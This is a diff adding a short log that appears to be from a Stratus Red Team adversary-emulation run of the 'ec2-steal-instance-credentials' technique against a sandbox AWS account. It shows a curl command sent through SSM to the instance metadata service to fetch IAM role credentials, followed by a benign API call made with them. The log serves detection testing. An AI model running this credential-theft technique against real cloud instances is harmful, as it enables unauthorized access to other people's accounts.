@@ -1,0 +1,8 @@
+2026/08/20 19:27:50 Checking your authentication against AWS
+2026/08/20 19:28:03 Note: This is a slow attack technique, it might take a long time to warm up or detonate
+2026/08/20 19:28:03 Not warming up - aws.credential-access.ec2-steal-instance-credentials is already warm. Use --force to force
+2026/08/20 19:28:03 Waiting for instance i-05abb3024e11f8e64 to show up in AWS SSM
+2026/08/20 19:28:05 Running command through SSM on i-05abb3024e11f8e64: curl 169.254.169.254/latest/meta-data/iam/security-credentials/stratus-red-team-ec2-steal-credentials-role/
+2026/08/20 19:28:10 Successfully stole temporary instance credentials from the instance metadata service
+2026/08/20 19:28:10 sts:GetCallerIdentity returned arn:aws:sts::<SANDBOX_ACCOUNT_ID>:assumed-role/stratus-red-team-ec2-steal-credentials-role/i-05abb3024e11f8e64
+2026/08/20 19:28:10 Locally running a benign API call ec2:DescribeInstances using stolen credentials
